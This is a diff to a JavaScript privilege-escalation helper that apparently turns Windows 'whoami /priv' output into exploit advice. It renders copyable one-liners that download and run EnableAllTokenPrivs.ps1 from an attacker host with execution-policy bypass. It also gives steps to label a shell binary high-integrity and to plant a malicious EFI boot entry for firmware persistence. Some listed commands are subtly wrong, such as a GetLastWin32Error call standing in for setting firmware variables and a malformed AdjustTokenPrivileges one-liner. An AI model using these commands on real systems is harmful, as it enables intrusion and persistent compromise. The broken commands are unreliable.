       {name:'PrivFu suite (IntegrityLevel)', note:'Enumerate and relabel objects via SeRelabelPrivilege', cmd:'{{WPATH}}\\SetIntegrityLevel.exe high {{WPATH}}\\shell.exe', link:'https://github.com/daem0nc0re/PrivFu'},
-      {name:'Manual SACL manipulation', note:'Use icacls to set high-integrity label on a writable SYSTEM service binary path', cmd:'icacls C:\\Temp\\shell.exe /setintegritylevel High', link:''},
-      {name:'Custom C (NtSetSecurityObject)', note:'SetSecurityInfo with LABEL_SECURITY_INFORMATION to set mandatory label', cmd:'# Compile custom tool — see: https://github.com/hatRiot/token-priv', link:'https://github.com/hatRiot/token-priv'},
+      {name:'Manual SACL manipulation', note:'Use icacls to set high-integrity label', cmd:'icacls C:\\Temp\\shell.exe /setintegritylevel High', link:''},
+      {name:'token-priv PoC (NtSetSecurityObject)', note:'SetSecurityInfo with LABEL_SECURITY_INFORMATION', cmd:'{{WPATH}}\\SeRelabelPrivilege.exe', link:'https://github.com/hatRiot/token-priv'},
     ],
-    warning:'Rarely assigned directly. Most impactful when combined with a writable path to a SYSTEM-owned process. Confirm with: whoami /priv',
+    warning:'NOTE: SeRelabelPrivilege in a token with IL less than High is DISABLED and cannot be used — it only matters if your token is already High IL. Confirm current IL with: whoami /groups | findstr "Integrity Level"',
     detect:'whoami /priv | findstr SeRelabel'
   },
   'SeSystemEnvironmentPrivilege': {
     sev:'h', section:'win-exploits',
-    summary:'Modify UEFI/EFI firmware environment variables → persistent UEFI implant or boot-order manipulation → survives OS reinstall.',
+    disabledOk: false,
+    enableHint: 'Run EnableAllTokenPrivs.ps1 first. This priv is for persistent firmware-level access — rarely the fastest path on an exam.',
+    summary:'Modify UEFI/EFI firmware environment variables → persistent UEFI implant → survives OS reinstall. Primarily a persistence technique.',
     tools:[
       {name:'RWEverything (RWE.exe)', note:'GUI tool to read/write EFI vars directly', cmd:'{{WPATH}}\\RWE.exe', link:'https://rweverything.com/'},
-      {name:'PowerShell Get/Set-FirmwareEnvironmentVariable', note:'Built-in API — requires privilege', cmd:'[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()', link:''},
-      {name:'efivar (concept)', note:'Note: primarily a persistence/covert technique, not instant SYSTEM. Combine with other privs.', cmd:'powershell -c "Add-Type -Name EFI -Namespace Win32 -MemberDefinition \'[DllImport(\\\"kernel32\\\")]\npublic static extern bool SetFirmwareEnvironmentVariable(string lpName,string lpGuid,byte[] pBuffer,uint nSize);\'; [Win32.EFI]::SetFirmwareEnvironmentVariable(\\\"BootOrder\\\",\\\"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}\\\",@(0,0),2)"', link:''},
+      {name:'PowerShell Set-FirmwareEnvironmentVariable', note:'Built-in — requires SeSystemEnvironment enabled', cmd:'[System.Runtime.InteropServices.Marshal]::GetLastWin32Error()', link:''},
     ],
     steps:[
-      '1. Verify privilege is enabled: whoami /priv | findstr SeSystemEnvironment',
-      '2. Use RWEverything to enumerate and modify EFI boot variables',
-      '3. For persistence: plant a malicious EFI boot entry pointing to attacker DLL',
-      '4. More immediately useful: combine with SeLoadDriverPrivilege for kernel-level persistence',
+      '1. whoami /priv | findstr SeSystemEnvironment',
+      '2. [EnableAllTokenPrivs.ps1 to enable]',
+      '3. Use RWEverything to enumerate and modify EFI boot variables',
+      '4. For persistence: plant malicious EFI boot entry pointing to attacker DLL',
     ],
-    warning:'Primarily a persistence/evasion technique. Does not give immediate SYSTEM on its own. Most impactful on physical-access or long-term implant scenarios.',
+    warning:'Primarily a persistence/evasion technique — not direct SYSTEM. Most useful on physical-access or long-term implant scenarios. Combine with SeLoadDriverPrivilege for deeper impact.',
     detect:'whoami /priv | findstr SeSystemEnvironment'
   },
 };
@@ -7539,19 +7597,54 @@ function parseTokenPrivs(raw, out) {
 
   html += '</div>';
 
-  // ── STEP 7: Sort matched privs — enabled critical first ────────────────────
+  // ── STEP 7: Sort matched privs ──────────────────────────────────────────────
+  // Priority: enabled > disabled+selfEnables > disabled+needsEnable; within each: crit > high > med > low
   const matched = privLines
     .map(p => ({...p, exploit: PRIV_EXPLOITS[p.name]}))
     .filter(p => p.exploit)
     .sort((a, b) => {
-      const aScore = (a.enabled ? 0 : 10) + (sevOrder[a.exploit.sev] || 3) * 2;
-      const bScore = (b.enabled ? 0 : 10) + (sevOrder[b.exploit.sev] || 3) * 2;
-      return aScore - bScore;
+      const disA = a.enabled ? 0 : (a.exploit.disabledOk ? 5 : 12);
+      const disB = b.enabled ? 0 : (b.exploit.disabledOk ? 5 : 12);
+      return (disA + (sevOrder[a.exploit.sev]||3)*2) - (disB + (sevOrder[b.exploit.sev]||3)*2);
     });
 
   const unmatched = privLines.filter(p => !PRIV_EXPLOITS[p.name]);
 
   let html2 = '<div class="si-vulns">';
+
+  // ── STEP 7b: Smart "disabled but present" banner ───────────────────────────
+  const disabledMatched      = matched.filter(p => !p.enabled);
+  const selfEnablingDisabled = disabledMatched.filter(p =>  p.exploit.disabledOk);
+  const needsEnableDisabled  = disabledMatched.filter(p => !p.exploit.disabledOk);
+
+  if (needsEnableDisabled.length > 0) {
+    const privList = needsEnableDisabled.map(p => `<code style="color:var(--orange)">${escHtml(p.name)}</code>`).join(' ');
+    html2 += `<div class="si-card" style="border-color:var(--orange);background:rgba(230,126,34,.08);margin-bottom:12px">
+      <div class="si-vtop">
+        <span class="si-vname" style="color:var(--orange)">&#9889; ACTION — ${needsEnableDisabled.length} exploit priv${needsEnableDisabled.length>1?'s':''} DISABLED but PRESENT in token</span>
+      </div>
+      <div style="font-size:11px;color:var(--text2);margin:6px 0;line-height:1.8">
+        These privileges appear in your token as <em>Disabled</em> — they are <strong>in your token</strong> and can be activated via <code>AdjustTokenPrivileges()</code>.
+        Run the one-liner below, then <strong>re-paste your updated <code>whoami /priv</code> output</strong> into this parser.
+      </div>
+      <div style="margin:6px 0 4px;font-size:11px;color:var(--text3)">Awaiting enable: ${privList}</div>
+      <code style="display:block;margin:8px 0;background:var(--bg4);padding:8px 12px;border-radius:3px;font-size:11px;color:var(--cyan);word-break:break-all;cursor:pointer" title="Click to copy" onclick="navigator.clipboard.writeText(this.textContent).then(()=>{this.style.color='var(--green)';setTimeout(()=>this.style.color='var(--cyan)',1500)})">iwr http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1 -o C:\\Temp\\ep.ps1; powershell -ep bypass -File C:\\Temp\\ep.ps1; whoami /priv</code>
+      <div style="font-size:11px;color:var(--text3)">
+        If download fails (no HTTP): <code style="color:var(--cyan);cursor:pointer" onclick="navigator.clipboard.writeText(this.textContent)">powershell -c "[System.Diagnostics.Process]::GetCurrentProcess().Id | % {$h=[System.Diagnostics.Process]::GetCurrentProcess().Handle; $t=0; Add-Type -MemberDefinition '[DllImport(\\"advapi32.dll\\")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref int n,int l,IntPtr p,IntPtr r);' -Name A -Namespace W; $W.A::AdjustTokenPrivileges($h,\$false,[ref]0,0,[IntPtr]::Zero,[IntPtr]::Zero)}"</code><br>
+        Repos: <a href="https://github.com/fashionproof/EnableAllTokenPrivs" target="_blank" style="color:var(--cyan)">fashionproof/EnableAllTokenPrivs &#8599;</a> &nbsp;|&nbsp;
+        <a href="https://github.com/tonyarris/srv/blob/main/enablealltokenprivs.ps1" target="_blank" style="color:var(--cyan)">tonyarris mirror &#8599;</a>
+      </div>
+    </div>`;
+  }
+
+  if (selfEnablingDisabled.length > 0) {
+    const privList2 = selfEnablingDisabled.map(p => `<code style="color:var(--teal)">${escHtml(p.name)}</code>`).join(' ');
+    html2 += `<div style="margin-bottom:10px;padding:7px 12px;background:rgba(26,188,156,.08);border-left:3px solid var(--teal);border-radius:0 4px 4px 0;font-size:11px;color:var(--text2)">
+      &#9432; ${privList2} ${selfEnablingDisabled.length>1?'are':'is'} <em>Disabled</em> but the exploit tool calls <code>AdjustTokenPrivileges()</code> internally —
+      <strong>run the exploit directly without pre-enabling.</strong>
+      ${selfEnablingDisabled.map(p=>`<br><span style="color:var(--text3)">&#8614; ${escHtml(p.name)}:</span> ${escHtml(p.exploit.enableHint||'')}`).join('')}
+    </div>`;
+  }
 
   // ── STEP 8: Group membership cards ─────────────────────────────────────────
   Object.entries(GROUP_EXPLOITS).forEach(([grp, info]) => {
@@ -7574,10 +7667,11 @@ function parseTokenPrivs(raw, out) {
     }
   });
 
+  // Only show "nothing found" if there are truly no matched privs at all (enabled OR disabled)
   if (matched.length === 0 && !Object.keys(GROUP_EXPLOITS).some(g => userGroups.includes(g))) {
-    html2 += '<div class="si-msg ok">&#10003; No directly exploitable privileges found in the known list. Run <code>winPEAS.exe</code> and <code>PrivescCheck.ps1</code> for deeper analysis.</div>';
+    html2 += '<div class="si-msg ok">&#10003; No privileges in the known-exploit list detected. Run <code>winPEAS.exe</code> and <code>PrivescCheck.ps1</code> for deeper analysis.</div>';
     if (privLines.some(p => p.name === 'SeChangeNotifyPrivilege')) {
-      html2 += '<div class="si-msg info" style="background:var(--bg3);border-left:3px solid var(--text3);margin-top:6px;font-size:11px">&#8505; <b>SeChangeNotifyPrivilege</b> is a default privilege granted to all users — it allows traversing directories without explicit read permission. It has <b>no known standalone escalation path</b>; its absence (not its presence) would be notable. No action needed for this privilege.</div>';
+      html2 += '<div style="margin-top:6px;padding:6px 10px;background:var(--bg3);border-left:3px solid var(--text3);border-radius:0 4px 4px 0;font-size:11px;color:var(--text3)">&#8505; <b>SeChangeNotifyPrivilege</b> (Bypass traverse checking) — default privilege held by all users. No standalone escalation path. Its <em>absence</em> would be unusual; its presence is not interesting.</div>';
     }
   }
 
@@ -7586,22 +7680,31 @@ function parseTokenPrivs(raw, out) {
     const ex = p.exploit;
     const cls = p.enabled ? 'sv-vuln' : 'sv-check';
     const sevLabel = ex.sev === 'c' ? 'CRITICAL' : ex.sev === 'h' ? 'HIGH' : ex.sev === 'm' ? 'MEDIUM' : 'LOW';
-    // Auto-expand steps for enabled critical/high privs
     const stepsOpen = (p.enabled && (ex.sev === 'c' || ex.sev === 'h')) ? 'open' : '';
 
-    const disabledNote = !p.enabled ? `
-      <div style="margin-top:6px;padding:6px 10px;background:rgba(210,153,34,.10);border:1px solid rgba(210,153,34,.25);border-radius:4px;font-size:11px;color:var(--orange)">
-        &#9744; <strong>Disabled</strong> in your token — still fully exploitable. Most tools re-enable it automatically via <code>AdjustTokenPrivileges()</code>.<br>
-        If a tool fails to self-enable it, force-enable all disabled privs with:<br>
-        <code style="display:block;margin-top:4px;color:var(--cyan);word-break:break-all;cursor:pointer" title="Click to copy" onclick="navigator.clipboard.writeText(this.textContent).then(()=>{this.style.color='var(--green)';setTimeout(()=>this.style.color='',1000)})">iwr http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1 -o C:\\Temp\\ep.ps1; powershell -ep bypass C:\\Temp\\ep.ps1</code>
-        <a href="https://github.com/fashionproof/EnableAllTokenPrivs" target="_blank" style="color:var(--cyan);font-size:10px">EnableAllTokenPrivs.ps1 repo &#8599;</a>
-      </div>` : '';
+    // Per-privilege disabled note — accurate, not generic
+    let disabledNote = '';
+    if (!p.enabled) {
+      if (ex.disabledOk) {
+        disabledNote = `<div style="margin-top:6px;padding:6px 10px;background:rgba(26,188,156,.10);border:1px solid rgba(26,188,156,.3);border-radius:4px;font-size:11px;color:var(--teal)">
+          &#9432; <strong>Disabled — but exploit runs DIRECTLY.</strong> ${escHtml(ex.enableHint||'Tool self-enables via AdjustTokenPrivileges() internally.')}
+        </div>`;
+      } else {
+        disabledNote = `<div style="margin-top:6px;padding:6px 10px;background:rgba(230,126,34,.10);border:1px solid rgba(230,126,34,.3);border-radius:4px;font-size:11px;color:var(--orange)">
+          &#9744; <strong>Disabled — enable first.</strong> ${escHtml(ex.enableHint||'Run EnableAllTokenPrivs.ps1 then re-check.')}
+          <code style="display:block;margin-top:5px;color:var(--cyan);word-break:break-all;cursor:pointer" title="Click to copy" onclick="navigator.clipboard.writeText(this.textContent).then(()=>{this.style.color='var(--green)';setTimeout(()=>this.style.color='var(--cyan)',1500)})">iwr http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1 -o C:\\Temp\\ep.ps1; powershell -ep bypass -File C:\\Temp\\ep.ps1</code>
+        </div>`;
+      }
+    }
 
     html2 += `<div class="si-card ${cls}">
       <div class="si-vtop">
         <span class="si-vname">&#9889; ${escHtml(p.name)}</span>
         <span class="si-stag s${ex.sev}">${sevLabel}</span>
-        <span class="si-vstatus">${p.enabled ? '&#9888; ENABLED' : '&#9744; DISABLED (still usable — see below)'}</span>
+        <span class="si-vstatus">${p.enabled
+          ? '&#9888; ENABLED — exploit now'
+          : (ex.disabledOk ? '&#9432; DISABLED — self-enables' : '&#9744; DISABLED — enable first')
+        }</span>
       </div>
       <div class="si-vdesc">${ex.summary}</div>
       ${ex.warning ? `<div class="si-vcond" style="color:var(--orange)">&#9888; ${escHtml(ex.warning)}</div>` : ''}
@@ -7611,7 +7714,7 @@ function parseTokenPrivs(raw, out) {
         <div style="margin:5px 0;background:var(--bg4);border-radius:3px;padding:6px 10px">
           <div style="font-size:10px;color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:.4px;margin-bottom:3px">
             ${escHtml(t.name)}${t.note ? ` <span style="color:var(--text3);font-weight:400;font-size:9px">— ${escHtml(t.note)}</span>` : ''}
-            ${t.link ? `<a href="${escHtml(t.link)}" target="_blank" style="margin-left:6px;font-size:10px">&#8599; repo</a>` : ''}
+            ${t.link ? `<a href="${escHtml(t.link)}" target="_blank" style="margin-left:6px;font-size:10px">&#8599;</a>` : ''}
           </div>
           <code style="font-size:11px;color:var(--text);word-break:break-all;cursor:pointer" title="Click to copy" onclick="navigator.clipboard.writeText(this.textContent).then(()=>{this.style.color='var(--green)';setTimeout(()=>this.style.color='',1000)})">${escHtml(t.cmd)}</code>
         </div>`).join('')}
@@ -7625,10 +7728,18 @@ function parseTokenPrivs(raw, out) {
 
   // ── STEP 10: Unmatched privileges footnote ─────────────────────────────────
   if (unmatched.length > 0) {
-    html2 += `<div style="margin-top:10px;padding:6px 10px;background:var(--bg4);border-radius:4px;font-size:11px;color:var(--text3)">
-      <span style="color:var(--text2)">Other privileges (no known direct exploit path):</span><br>
-      ${unmatched.map(p => `<code style="font-size:10px;background:var(--bg3);padding:2px 5px;border-radius:2px;margin:2px 2px 0 0;display:inline-block;color:${p.enabled ? 'var(--text)' : 'var(--text3)'}">${escHtml(p.name)}${p.enabled ? ' &#9679;' : ''}</code>`).join(' ')}
-    </div>`;
+    const knownDefault = new Set(['SeChangeNotifyPrivilege','SeIncreaseWorkingSetPrivilege','SeMachineAccountPrivilege','SeUndockPrivilege','SeUnsolicitedInputPrivilege','SeTimeZonePrivilege']);
+    const unmatchedDefault = unmatched.filter(p =>  knownDefault.has(p.name));
+    const unmatchedOther   = unmatched.filter(p => !knownDefault.has(p.name));
+    let footnote = '';
+    if (unmatchedOther.length > 0) {
+      footnote += `<span style="color:var(--text2)">Other privileges (not in known-exploit list — research manually):</span><br>
+        ${unmatchedOther.map(p => `<code style="font-size:10px;background:var(--bg3);padding:2px 5px;border-radius:2px;margin:2px 2px 0 0;display:inline-block;color:${p.enabled ? 'var(--text)' : 'var(--text3)'}">${escHtml(p.name)}${p.enabled ? ' &#9679;' : ''}</code>`).join(' ')}`;
+    }
+    if (unmatchedDefault.length > 0) {
+      footnote += `<br><span style="color:var(--text3);font-size:10px">Default/harmless: ${unmatchedDefault.map(p=>`<code style="font-size:9px;padding:1px 4px;background:var(--bg3);border-radius:2px">${escHtml(p.name)}</code>`).join(' ')}</span>`;
+    }
+    if (footnote) html2 += `<div style="margin-top:10px;padding:6px 10px;background:var(--bg4);border-radius:4px;font-size:11px;color:var(--text3)">${footnote}</div>`;
   }
 
   html2 += '</div>';
